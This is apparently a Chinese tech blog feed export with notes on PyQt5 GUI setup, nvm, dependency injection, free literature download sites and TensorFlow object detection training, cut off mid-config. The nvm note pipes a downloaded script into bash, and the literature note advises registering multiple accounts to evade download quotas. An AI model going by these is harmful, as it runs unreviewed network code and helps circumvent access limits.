<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="安装python3"><a href="#安装python3" class="headerlink" title="安装python3"></a>安装python3</h2><p>PyQt5所支持的python版本是从3.5开始的，因此安装的Python3版本必须大于3.5。</p>
<h2 id="安装PyQt5"><a href="#安装PyQt5" class="headerlink" title="安装PyQt5"></a>安装PyQt5</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install PyQt5</span><br><span class="line">pip3 install PyQt5-tools</span><br></pre></td></tr></table></figure>

<h2 id="安装PyCharm"><a href="#安装PyCharm" class="headerlink" title="安装PyCharm"></a>安装PyCharm</h2><p>安装完PyCharm后，需要配置Qt Designer和PyUIC，前者用于设计UI，后者用于将UI转成Py文件。</p>
<p>具体步骤请参考<a href="https://www.cnblogs.com/zhoug2020/p/9039993.html" target="_blank" rel="noopener">程序员之路：python3+PyQt5+pycharm桌面GUI开发</a>。</p>
<h1 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line"># Form implementation generated from reading ui file &#39;clearWaterPrintGui.ui&#39;</span><br><span class="line">#</span><br><span class="line"># Created by: PyQt5 UI code generator 5.11.3</span><br><span class="line">#</span><br><span class="line"># WARNING! All changes made in this file will be lost!</span><br><span class="line"></span><br><span class="line">from PyQt5 import QtCore, QtGui, QtWidgets</span><br><span class="line"></span><br><span class="line">class Ui_Form(object):</span><br><span class="line">    def setupUi(self, Form):</span><br><span class="line">        Form.setObjectName(&quot;Form&quot;)</span><br><span class="line">        Form.resize(400, 300)</span><br><span class="line">        self.label_DirPath &#x3D; QtWidgets.QLabel(Form)</span><br><span class="line">        self.label_DirPath.setGeometry(QtCore.QRect(16, 52, 72, 15))</span><br><span class="line">        self.label_DirPath.setObjectName(&quot;label_DirPath&quot;)</span><br><span class="line">        self.label_ExtName &#x3D; QtWidgets.QLabel(Form)</span><br><span class="line">        self.label_ExtName.setGeometry(QtCore.QRect(31, 112, 72, 15))</span><br><span class="line">        self.label_ExtName.setObjectName(&quot;label_ExtName&quot;)</span><br><span class="line">        self.buttonBox &#x3D; QtWidgets.QDialogButtonBox(Form)</span><br><span class="line">        self.buttonBox.setGeometry(QtCore.QRect(190, 260, 193, 28))</span><br><span class="line">        self.buttonBox.setInputMethodHints(QtCore.Qt.ImhNone)</span><br><span class="line">        self.buttonBox.setStandardButtons(QtWidgets.QDialogButtonBox.Cancel|QtWidgets.QDialogButtonBox.Ok)</span><br><span class="line">        self.buttonBox.setObjectName(&quot;buttonBox&quot;)</span><br><span class="line">        self.lineEdit_DirPath &#x3D; QtWidgets.QLineEdit(Form)</span><br><span class="line">        self.lineEdit_DirPath.setGeometry(QtCore.QRect(100, 50, 281, 21))</span><br><span class="line">        self.lineEdit_DirPath.setObjectName(&quot;lineEdit_DirPath&quot;)</span><br><span class="line">        self.lineEdit_ExtName &#x3D; QtWidgets.QLineEdit(Form)</span><br><span class="line">        self.lineEdit_ExtName.setGeometry(QtCore.QRect(100, 112, 281, 21))</span><br><span class="line">        self.lineEdit_ExtName.setObjectName(&quot;lineEdit_ExtName&quot;)</span><br><span class="line"></span><br><span class="line">        self.retranslateUi(Form)</span><br><span class="line">        QtCore.QMetaObject.connectSlotsByName(Form)</span><br><span class="line"></span><br><span class="line">    def retranslateUi(self, Form):</span><br><span class="line">        _translate &#x3D; QtCore.QCoreApplication.translate</span><br><span class="line">        Form.setWindowTitle(_translate(&quot;Form&quot;, &quot;Form&quot;))</span><br><span class="line">        self.label_DirPath.setText(_translate(&quot;Form&quot;, &quot;文件路径：&quot;))</span><br><span class="line">        self.label_ExtName.setText(_translate(&quot;Form&quot;, &quot;扩展名：&quot;))</span><br><span class="line"></span><br><span class="line"># 下面代码是手动添加的</span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">    import sys</span><br><span class="line">    from PyQt5.QtGui import QIcon</span><br><span class="line">    app&#x3D;QtWidgets.QApplication(sys.argv)</span><br><span class="line">    widget&#x3D;QtWidgets.QWidget()</span><br><span class="line">    ui&#x3D;Ui_Form()</span><br><span class="line">    ui.setupUi(widget)</span><br><span class="line">    # widget.setWindowIcon(QIcon(&#39;web.png&#39;))#增加icon图标，如果没有图片可以没有这句</span><br><span class="line">    widget.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/zhoug2020/p/9039993.html" target="_blank" rel="noopener">程序员之路：python3+PyQt5+pycharm桌面GUI开发</a>,by 莫水千流.</li>
<li><a href="http://www.futantan.com/2015/11/22/use-pyqt-develop-gui/" target="_blank" rel="noopener">使用PyQt快速开发GUI应用</a>,by Prayer.</li>
<li><a href="https://zh.wikipedia.org/wiki/PyQt" target="_blank" rel="noopener">PyQt</a>,by wikipedia.</li>
<li><a href="https://www.cnblogs.com/lsgxeva/p/7826761.html" target="_blank" rel="noopener">Qt Widgets、QML、Qt Quick的区别</a>,by 云水.</li>
<li><a href="https://blog.csdn.net/shenziheng1/article/details/78055056" target="_blank" rel="noopener">Q_OBJECT宏的作用</a>,by 沈子恒.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>使用nvm进行nodejs版本管理</title>
    <url>/2019/05/11/%E4%BD%BF%E7%94%A8nvm%E8%BF%9B%E8%A1%8Cnodejs%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<p>nvm是一个简单bash脚本，用于管理多个活动的nodejs版本。在linux操作系统中使用nvm安装和管理nodejs十分方便。在windows操作系统下则使用nvm-windows对nodejs版本进行管理。下面简单介绍ubuntu 16.04操作系统下nvm的安装使用。</p>
<h1 id="安装脚本"><a href="#安装脚本" class="headerlink" title="安装脚本"></a>安装脚本</h1><p>在Ubuntu 16.04的终端中，直接运行如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -qO- https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;nvm-sh&#x2F;nvm&#x2F;v0.34.0&#x2F;install.sh | bash</span><br></pre></td></tr></table></figure>

<h1 id="管理Nodejs"><a href="#管理Nodejs" class="headerlink" title="管理Nodejs"></a>管理Nodejs</h1><ul>
<li>安装最新nodejs长期支持版<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># in linux</span><br><span class="line">nvm ls-remote</span><br><span class="line"># in windows</span><br><span class="line">nvm ls available</span><br><span class="line"># install node and use</span><br><span class="line">nvm install --lts</span><br><span class="line">nvm install 12.22.12</span><br><span class="line">nvm use 12.22.12</span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li>卸载最新nodejs长期支持版<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nvm uninstall --lts</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="nvm设置代理"><a href="#nvm设置代理" class="headerlink" title="nvm设置代理"></a>nvm设置代理</h1><p>在 nvm 的安装路径下，找到 settings.txt，在后面加上这两行:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">node_mirror: https:&#x2F;&#x2F;npm.taobao.org&#x2F;mirrors&#x2F;node&#x2F;</span><br><span class="line">npm_mirror: https:&#x2F;&#x2F;npm.taobao.org&#x2F;mirrors&#x2F;npm&#x2F;</span><br></pre></td></tr></table></figure>

<h1 id="nvm离线安装"><a href="#nvm离线安装" class="headerlink" title="nvm离线安装"></a>nvm离线安装</h1><p>无法连接互联网的Windows环境下，使用nvm的前提是，需要在有互联网环境下将自己所需要的 Node版本，使用 nvm install 版本号 下载到本地，然后将 C:\Users\Administrator\AppData\Roaming\nvm 目录下的对应版本文件拷贝到离线安装后的文件夹中即可。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://github.com/nvm-sh/nvm" target="_blank" rel="noopener">Node Version Manager</a>, by nvm-sh.</li>
<li><a href="https://github.com/coreybutler/nvm-windows" target="_blank" rel="noopener">nvm-windows</a>,by nvm-windows.</li>
<li><a href="https://juejin.im/post/6844903906934259726" target="_blank" rel="noopener">nvm 在 Windows 中的使用及离线安装</a>,by tyronchen.</li>
<li><a href="https://www.jianshu.com/p/324044f2f542" target="_blank" rel="noopener">Windows上安装nodejs版本管理器nvm</a>,by weiqinl.</li>
<li><a href="https://github.com/xhlwill/blog/issues/7" target="_blank" rel="noopener">nvm 设置下载 node 的镜像地址</a>,by xhlwill.</li>
<li><a href="https://www.runoob.com/w3cnote/nvm-manager-node-versions.html" target="_blank" rel="noopener">使用 nvm 管理不同版本的 node 与 npm</a>,by runoob.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>人工智能——人类科技再次飞跃的门槛</title>
    <url>/2018/11/21/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E2%80%94%E2%80%94%E4%BA%BA%E7%B1%BB%E7%A7%91%E6%8A%80%E5%86%8D%E6%AC%A1%E9%A3%9E%E8%B7%83%E7%9A%84%E9%97%A8%E6%A7%9B/</url>
    <content><![CDATA[<p>人工智能的研究历史有着一条从以“推理”为重点，到以“知识”为重点，再到以“学习”为重点的自然、清晰的脉络。机器学习则是实现人工智能的一个途径，即以机器学习为手段解决人工智能中的问题。</p>
<h1 id="问题的提出"><a href="#问题的提出" class="headerlink" title="问题的提出"></a>问题的提出</h1><h1 id="问题的分析"><a href="#问题的分析" class="headerlink" title="问题的分析"></a>问题的分析</h1><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="https://zh.wikipedia.org/zh-hans/机器学习" target="_blank" rel="noopener">机器学习</a>, by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>中文文献免费下载方法</title>
    <url>/2018/08/26/%E4%B8%AD%E6%96%87%E6%96%87%E7%8C%AE%E5%85%8D%E8%B4%B9%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>下面记录经过验证可用的中文文献下载方法:</p>
<ol>
<li>idata中国知网 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">idata中国知网网址：https:&#x2F;&#x2F;www.cn-ki.net&#x2F;</span><br><span class="line">进入系统，注册账号，登陆就可以每天免费下载五篇知网论文。</span><br><span class="line">额度用完之后，第二天可以继续下载。</span><br><span class="line">每天五篇的额度基本能满足需要，这样还不够的话，可以多注册几个账号。</span><br></pre></td></tr></table></figure></li>
<li>全国图书馆参考咨询联盟<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">全国图书馆参考咨询联盟网址：http:&#x2F;&#x2F;www.ucdrs.superlib.net&#x2F;</span><br><span class="line">很全，可以查图书，查期刊，报纸等。还有硕士，博士的毕业论文。不仅有中文，还有外文。</span><br><span class="line">网站无需注册，通过文献传递服务，即通过邮箱接收全文。最快一两分钟，最慢三四个小时即可接收到全文。</span><br></pre></td></tr></table></figure></li>
<li>上海研发公共服务平台<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">上海研发公共服务平台网址：http:&#x2F;&#x2F;www.sgst.cn&#x2F;。</span><br><span class="line">注册后可直接下载，论文、文献数量直接匹配知网和万方数据。</span><br><span class="line">下载速度较快，但有数量限制，可注册多个用户名。</span><br></pre></td></tr></table></figure></li>
<li>库问搜索<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">库问搜索网址：http:&#x2F;&#x2F;www.koovin.com&#x2F;。</span><br><span class="line">库问搜索提供千万级文献免费下载。</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
      </tags>
  </entry>
  <entry>
    <title>依赖注入入门</title>
    <url>/2019/01/26/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="依赖注入定义"><a href="#依赖注入定义" class="headerlink" title="依赖注入定义"></a>依赖注入定义</h1><p>在软件工程中，依赖注入是种实现控制反转用于解决依赖性设计模式。一个依赖关系指的是可被利用的一种对象（即服务提供端） 。依赖注入是将所依赖的传递给将使用的从属对象（即客户端）。该服务是将会变成客户端的状态的一部分。 传递服务给客户端，而非允许客户端来建立或寻找服务，是本设计模式的基本要求。</p>
<h1 id="依赖注入意义"><a href="#依赖注入意义" class="headerlink" title="依赖注入意义"></a>依赖注入意义</h1><h2 id="依赖存在的问题"><a href="#依赖存在的问题" class="headerlink" title="依赖存在的问题"></a>依赖存在的问题</h2><p>如果在 Class A 中，有 Class B 的实例，则称 Class A 对 Class B 有一个依赖。例如下面类 Human 中用到一个 Father 对象，我们就说类 Human 对类 Father 有一个依赖。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class Human &#123;</span><br><span class="line">    ...</span><br><span class="line">    Father father;</span><br><span class="line">    ...</span><br><span class="line">    public Human() &#123;</span><br><span class="line">        father &#x3D; new Father();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>仔细看这段代码我们会发现存在一些问题：</p>
<ul>
<li>如果现在要改变 father 生成方式，如需要用new Father(String name)初始化 father，需要修改 Human 代码；</li>
<li>如果想测试不同 Father 对象对 Human 的影响很困难，因为 father 的初始化被写死在了 Human 的构造函数中；</li>
<li>如果new Father()过程非常缓慢，单测时我们希望用已经初始化好的 father 对象 Mock 掉这个过程也很困难。</li>
</ul>
<h2 id="依赖注入的好处"><a href="#依赖注入的好处" class="headerlink" title="依赖注入的好处"></a>依赖注入的好处</h2><p>上面将依赖在构造函数中直接初始化是一种 Hard init 方式，弊端在于两个类不够独立，不方便测试。我们还有另外一种 Init 方式，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class Human &#123;</span><br><span class="line">    ...</span><br><span class="line">    Father father;</span><br><span class="line">    ...</span><br><span class="line">    public Human(Father father) &#123;</span><br><span class="line">        this.father &#x3D; father;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，我们将 father 对象作为构造函数的一个参数传入。在调用 Human 的构造方法之前外部就已经初始化好了 Father 对象。像这种非自己主动初始化依赖，而通过外部来传入依赖的方式，我们就称为依赖注入。</p>
<p>现在我们发现上面 1 中存在的两个问题都很好解决了，简单的说依赖注入主要有两个好处：</p>
<ul>
<li>解耦，将依赖之间解耦。</li>
<li>因为已经解耦，所以方便做单元测试，尤其是 Mock 测试。</li>
</ul>
<h1 id="依赖注入实现"><a href="#依赖注入实现" class="headerlink" title="依赖注入实现"></a>依赖注入实现</h1><h2 id="Java中的依赖注入"><a href="#Java中的依赖注入" class="headerlink" title="Java中的依赖注入"></a>Java中的依赖注入</h2><p>依赖注入的实现有多种途径，而在 Java 中，使用注解是最常用的。通过在字段的声明前添加 @Inject 注解进行标记，来实现依赖对象的自动注入。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class Human &#123;</span><br><span class="line">    ...</span><br><span class="line">    @Inject Father father;</span><br><span class="line">    ...</span><br><span class="line">    public Human() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面这段代码看起来很神奇：只是增加了一个注解，Father 对象就能自动注入了？这个注入过程是怎么完成的？</p>
<p>实质上，如果你只是写了一个 @Inject 注解，Father 并不会被自动注入。你还需要使用一个依赖注入框架，并进行简单的配置。现在 Java 语言中较流行的依赖注入框架有 Google Guice、Spring 等，而在 Android 上比较流行的有 RoboGuice、Dagger 等。</p>
<h2 id="PHP中的依赖注入"><a href="#PHP中的依赖注入" class="headerlink" title="PHP中的依赖注入"></a>PHP中的依赖注入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Application</span><br><span class="line">&#123;</span><br><span class="line">    function __construct(Auth $auth, Session $session)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;auth    &#x3D; $auth;</span><br><span class="line">        $this-&gt;session &#x3D; $session;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; ... 程式 ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$auth        &#x3D; new Auth(&#39;localhost&#39;, &#39;root&#39;, &#39;&#39;);</span><br><span class="line">$session     &#x3D; new Session();</span><br><span class="line">$application &#x3D; new Application($auth, $session);</span><br><span class="line"></span><br><span class="line">$application-&gt;login(&#39;admin&#39;, &#39;admin&#39;);</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/依赖注入" target="_blank" rel="noopener">依赖注入</a>,by wikipedia.</li>
<li><a href="https://github.com/android-cn/blog/tree/master/java/dependency-injection" target="_blank" rel="noopener">依赖注入</a>,by android-cn.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>使用tensorflow_object_detection_api训练自定义模型</title>
    <url>/2018/10/20/%E4%BD%BF%E7%94%A8tensorflow-object-detection-api%E8%AE%AD%E7%BB%83%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<p>近期研究目标对象检测和识别，发现谷歌开源的基于tensorflow的object detection api模型效果不错，于是git clone下来测试一下。下面记录我在debian linux上安装配置object detection api模型，构建自定义数据集，训练和测试object detection api模型的过程，以及整个过程中遇到的一下问题，需要注意的事项。</p>
<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h2><p>TensorFlow 程序在 GPU 上的运行速度通常要比在 CPU 上快得多，在系统满足NVIDIA 软件要求的前提下，推荐使用支持 GPU 的 TensorFlow。</p>
<p>官方推荐使用Docker简化TensorFlow的GPU支持配置，这样只需要linux主机安装好Nvidia GPU驱动即可。</p>
<ol>
<li><p>安装docker<br>安装docker的方法可参考链接1。</p>
</li>
<li><p>安装nvidia-docker</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Add the package repositories</span><br><span class="line">curl -s -L https:&#x2F;&#x2F;nvidia.github.io&#x2F;nvidia-docker&#x2F;gpgkey | sudo apt-key add -</span><br><span class="line">curl -s -L https:&#x2F;&#x2F;nvidia.github.io&#x2F;nvidia-docker&#x2F;debian9&#x2F;nvidia-docker.list | \</span><br><span class="line">  sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;nvidia-docker.list</span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line"># Install nvidia-docker2 and reload the Docker daemon configuration</span><br><span class="line">sudo apt-get install -y nvidia-docker2</span><br><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure>
</li>
<li><p>下载最新支持GPU和Python3的tensorflow映像<sup>[2]</sup></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull tensorflow&#x2F;tensorflow:latest-gpu-py3</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试tensorflow映像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run --runtime&#x3D;nvidia -it --rm tensorflow&#x2F;tensorflow:latest-gpu-py3 \</span><br><span class="line">    python -c &quot;import tensorflow as tf; print(tf.contrib.eager.num_gpus())&quot;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="下载TFModel库及其相关库"><a href="#下载TFModel库及其相关库" class="headerlink" title="下载TFModel库及其相关库"></a>下载TFModel库及其相关库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 基于tensorflow的模型和例子</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;tensorflow&#x2F;models.git</span><br><span class="line"># raccoon数据集，可参考其中生成TFRecord格式数据的方法</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;datitran&#x2F;raccoon_dataset.git</span><br></pre></td></tr></table></figure>

<h2 id="安装Python虚拟环境管理工具"><a href="#安装Python虚拟环境管理工具" class="headerlink" title="安装Python虚拟环境管理工具"></a>安装Python虚拟环境管理工具</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 具体安装配置过程参见链接3</span><br><span class="line">sudo pip3 install virtualenv</span><br><span class="line">sudo pip3 install virtualenvwrapper</span><br><span class="line">mkvirtualenv object-detection --python&#x3D;&#x2F;usr&#x2F;bin&#x2F;python3# 创建python3虚拟环境</span><br></pre></td></tr></table></figure>

<h2 id="数据标注"><a href="#数据标注" class="headerlink" title="数据标注"></a>数据标注</h2><p>以分类几何形状为例，收集相关图片后，需要对它们进行标注。推荐使用 LabelImg 进行标注，生成的文件是 PASCAL VOC 的 xml 格式。这个工具还可以加载标注文件，检查标注结果<sup>[3]</sup>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;tzutalin&#x2F;labelImg.git</span><br><span class="line">workon object-detection</span><br><span class="line"># 启动python3虚拟环境</span><br><span class="line">workon object-detection</span><br><span class="line"># 安装配置labelImg</span><br><span class="line">sudo apt-get install pyqt5-dev-tools</span><br><span class="line">sudo pip3 install -r requirements&#x2F;requirements-linux-python3.txt</span><br><span class="line">make qt5py3</span><br><span class="line">python3 labelImg.py</span><br></pre></td></tr></table></figure>

<p>除了标注图片，还需创建一个 .pbtxt 文件用来说明标注的分类。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">item &#123;</span><br><span class="line">  id: 1</span><br><span class="line">  name: &#39;circle&#39;</span><br><span class="line">&#125;</span><br><span class="line">item &#123;</span><br><span class="line">  id: 2</span><br><span class="line">  name: &#39;square&#39;</span><br><span class="line">&#125;</span><br><span class="line">item &#123;</span><br><span class="line">  id: 3</span><br><span class="line">  name: &#39;triangle&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要特别注意以下两点：</p>
<ul>
<li>name 不支持直接写中文，需要 UTF-8 编码</li>
<li>id 从 1 开始编号，不能从 0 开始编号。</li>
</ul>
<h2 id="数据准备"><a href="#数据准备" class="headerlink" title="数据准备"></a>数据准备</h2><p>标注好的数据是图片文件（<em>.jpg）和标注文件（</em>.xml），而 TensorFlow 不能直接用这些数据作为输入，还需要转成 TFRecord 格式。可采用两种方法生成TFRecord格式数据：</p>
<ul>
<li>tensorflow/models中方法</li>
</ul>
<p>项目中使用create_pascal_tf_record.py, create_pet_tf_record.py生成TFrecord 格式数据</p>
<ul>
<li>raccoon_dataset中方法</li>
</ul>
<p>项目中使用xml_to_csv.py把xml合并成一个CSV文件，使用split labels.ipynb 随机划分训练集和测试集，以及使用generate_tfrecord.py 生成相对应的 TFRecord 训练集和测试集。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">workon object-detection</span><br><span class="line"># 将生成geometry_labels.csv</span><br><span class="line">python xml_to_csv.py</span><br><span class="line"># 打开split labels.ipynb生产训练集train_labels.csv和测试集test_labels.csv</span><br><span class="line">jupyter notebook</span><br><span class="line"># 创建训练用TFRecord文件:</span><br><span class="line">python generate_tfrecord.py --csv_input&#x3D;data&#x2F;train_labels.csv  --output_path&#x3D;training&#x2F;geometry_train.record</span><br><span class="line"># 创建测试用TFRecord文件:</span><br><span class="line">python generate_tfrecord.py --csv_input&#x3D;data&#x2F;test_labels.csv  --output_path&#x3D;training&#x2F;geometry_test.record</span><br></pre></td></tr></table></figure>

<p>第二种方法比较直观，因此我采用第二种方法生产TFRecord数据。</p>
<h1 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h1><h2 id="安装TFModel依赖"><a href="#安装TFModel依赖" class="headerlink" title="安装TFModel依赖"></a>安装TFModel依赖</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">workon object-detection</span><br><span class="line"># For CPU</span><br><span class="line">pip install tensorflow</span><br><span class="line"># For GPU</span><br><span class="line">pip install tensorflow-gpu</span><br><span class="line"></span><br><span class="line">pip install --user Cython</span><br><span class="line">pip install --user contextlib2</span><br><span class="line">pip install --user pillow</span><br><span class="line">pip install --user lxml</span><br><span class="line">pip install --user jupyter</span><br><span class="line">pip install --user matplotlib</span><br></pre></td></tr></table></figure>
<h2 id="安装COCO-API"><a href="#安装COCO-API" class="headerlink" title="安装COCO API"></a>安装COCO API</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;cocodataset&#x2F;cocoapi.git</span><br><span class="line">cd cocoapi&#x2F;PythonAPI</span><br><span class="line">make</span><br><span class="line">cp -r pycocotools &lt;path_to_tensorflow&gt;&#x2F;models&#x2F;research&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="编译Protobuf"><a href="#编译Protobuf" class="headerlink" title="编译Protobuf"></a>编译Protobuf</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># From tensorflow&#x2F;models&#x2F;research&#x2F;</span><br><span class="line">wget -O protobuf.zip https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;protobuf&#x2F;releases&#x2F;download&#x2F;v3.0.0&#x2F;protoc-3.0.0-linux-x86_64.zip</span><br><span class="line">unzip protobuf.zip</span><br><span class="line"></span><br><span class="line"># From tensorflow&#x2F;models&#x2F;research&#x2F;</span><br><span class="line">.&#x2F;bin&#x2F;protoc object_detection&#x2F;protos&#x2F;*.proto --python_out&#x3D;.</span><br></pre></td></tr></table></figure>

<h2 id="添加库到PYTHONPATH"><a href="#添加库到PYTHONPATH" class="headerlink" title="添加库到PYTHONPATH"></a>添加库到PYTHONPATH</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># From tensorflow&#x2F;models&#x2F;research&#x2F;</span><br><span class="line"># 每次调用TFModel的Object Detection API之前都要设置</span><br><span class="line">export PYTHONPATH&#x3D;$PYTHONPATH:&#96;pwd&#96;:&#96;pwd&#96;&#x2F;slim</span><br></pre></td></tr></table></figure>

<h2 id="安装测试"><a href="#安装测试" class="headerlink" title="安装测试"></a>安装测试</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># if all tests is ok, the installation is no problem.</span><br><span class="line">python object_detection&#x2F;builders&#x2F;model_builder_test.py</span><br></pre></td></tr></table></figure>

<h1 id="模型训练"><a href="#模型训练" class="headerlink" title="模型训练"></a>模型训练</h1><h2 id="数据准备-1"><a href="#数据准备-1" class="headerlink" title="数据准备"></a>数据准备</h2><ol>
<li>将label_map文件、训练用TFRecord文件、测试用TFRecord文件复制到tensorflow/models/research/object_detection/data文件夹下。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 推荐的数据目录结构</span><br><span class="line">+ data</span><br><span class="line">  - geometry.pbtxt</span><br><span class="line">  - geometry_test.record</span><br><span class="line">  - geometry_train.record</span><br></pre></td></tr></table></figure></li>
<li>下载COCO预训练模型用于迁移学习<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># From tensorflow&#x2F;models&#x2F;research&#x2F;object-detection</span><br><span class="line">wget http:&#x2F;&#x2F;download.tensorflow.org&#x2F;models&#x2F;object_detection&#x2F;ssd_mobilenet_v1_coco_2018_01_28.tar.gz</span><br><span class="line">tar -xvf ssd_mobilenet_v1_coco_2018_01_28.tar.gz</span><br></pre></td></tr></table></figure></li>
<li>修改解压后模型文件夹中pipeline.config</li>
</ol>
<p>解压ssd_mobilenet_v1_coco_2018_01_28模型后会看到一个 .config 文件，里面包含有模型的参数，训练的参数，评估的参数等。这里需要修改到的有，</p>
<ul>
<li>模型参数中的 num_classes，改成你的类别数，</li>
<li>训练参数中的 fine_tune_checkpoint，采用迁移学习，这里路径的指向刚才下载的Pre-train模型，比如 ssd_mobilenet_v1_coco_11_06_2017/model.ckpt</li>
<li>train_input_reader 下面的 input_path，改成你的训练数据，例如 data/train.record。label_map_path，改成你的 pbtxt 文件路径，例如 data/object.pbtxt</li>
<li>eval_input_reader 下面的 input_path，也需要改成你的测试集，例如 data/test.record。同样，label_map_path，也改成你的 pbtxt 文件路径，例如 data/object.pbtxt<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;pipeline.config修改示例</span><br><span class="line">model &#123;</span><br><span class="line">  ssd &#123;</span><br><span class="line">    num_classes: 3</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">train_config &#123;</span><br><span class="line">  ...</span><br><span class="line">  fine_tune_checkpoint: &quot;object_detection&#x2F;ssd_mobilenet_v1_coco_2018_01_28&#x2F;model.ckpt&quot;</span><br><span class="line">  from_detection_checkpoint: true</span><br><span class="line">  num_steps: 50000</span><br><span class="line">&#125;</span><br><span class="line">train_input_reader &#123;</span><br><span class="line">  label_map_path: &quot;object_detection&#x2F;data&#x2F;geometry.pbtxt&quot;</span><br><span class="line">  tf_record_input_reader &#123;</span><br><span class="line">    input_path: &quot;object_detection&#x2F;data&#x2F;geometry_train.record&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">eval_input_reader &#123;</span><br><span class="line">  label_map_path: &quot;object_detection&#x2F;data&#x2F;geometry.pbtxt&quot;</span><br><span class="line">  shuffle: false</span><br><span class="line">  